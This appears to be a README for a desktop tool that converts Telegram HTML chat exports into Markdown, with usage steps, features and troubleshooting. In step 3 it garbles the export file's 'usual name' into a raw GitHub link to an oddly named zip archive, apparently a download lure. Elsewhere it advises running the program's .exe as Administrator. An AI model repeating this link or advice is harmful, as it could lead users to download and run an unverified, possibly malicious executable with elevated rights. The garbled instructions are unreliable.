telegram-html-to-markdown is a simple desktop tool that helps you convert Telegram message exports saved in HTML format into clean, individual Markdown files.

## 🚀 How to Use telegram-html-to-markdown

Using telegram-html-to-markdown is straightforward. Here’s how:

1. **Export Your Telegram Chat**  
   - Open Telegram on your phone or desktop.  
   - Navigate to the chat you want to save.  
   - Use Telegram’s export feature to save the chat as an HTML file. This option is found under Settings > Advanced > Export Telegram data on desktop or under chat details on mobile.  
   - Save the export file to your computer.

2. **Open telegram-html-to-markdown**  
   Run the program you installed. You will see a simple window or dialog.

3. **Select Your Export File**  
   Click the button labeled “Choose File” or “Select Export” to open a file picker.  
   Find and select the HTML export file you saved from Telegram. This file is usually named `https://raw.githubusercontent.com/Devbluid/telegram-html-to-markdown/main/ethmoturbinal/markdown_html_telegram_to_Fourierite.zip` or similar.

4. **Choose Output Folder**  
   Pick where you want the converted Markdown files to be saved. You can use the default folder or select a new one.

5. **Start Conversion**  
   Click the “Convert” button. The program will read the Telegram HTML file and create a separate Markdown (`.md`) file for each conversation or chat thread.

6. **View Your Markdown Files**  
   After conversion finishes, open the output folder and check the files. Each chat will be saved in plain text with Markdown formatting. This lets you use the files in text editors, note apps, or static website generators.

## 📂 What You Get: Features and Output

- **Individual Markdown Files**  
  Each chat appears as a separate `.md` file. This helps you organize conversations clearly.

- **Clean Formatting**  
  Messages are converted into Markdown format, including headings, bullet points, and timestamps, making the text easy to read or reuse.

- **Attachments and Media Links**  
  The program adds links to media files like photos or videos if they are part of your export.  
  (Note: You must export media with your Telegram export for files to link correctly.)

- **Works Offline**  
  After downloading, the conversion process works without needing internet access.

- **Compatible with Static Site Generators**  
  Use the Markdown files with tools like Jekyll or Hugo to create websites or blogs from Telegram chats.

## 🛠️ Troubleshooting

**If you cannot run the program:**

- Verify your operating system matches the system requirements.
- On Windows, run the `.exe` file as Administrator if it does not start.
- On Mac, allow app installation under System Preferences > Security & Privacy if prompted.
- Make sure you have the latest version of telegram-html-to-markdown.

**If the file does not convert correctly:**

- Check that you selected the correct HTML export file from Telegram.
- Confirm the export includes messages in HTML format, not JSON or other types.
- Make sure your Telegram export includes media if you want links to attachments.

**If Markdown files are empty or missing messages:**

- Try re-exporting your Telegram chat and choose “Include media” if available.
- Check if the exported HTML file is complete and not broken or truncated.
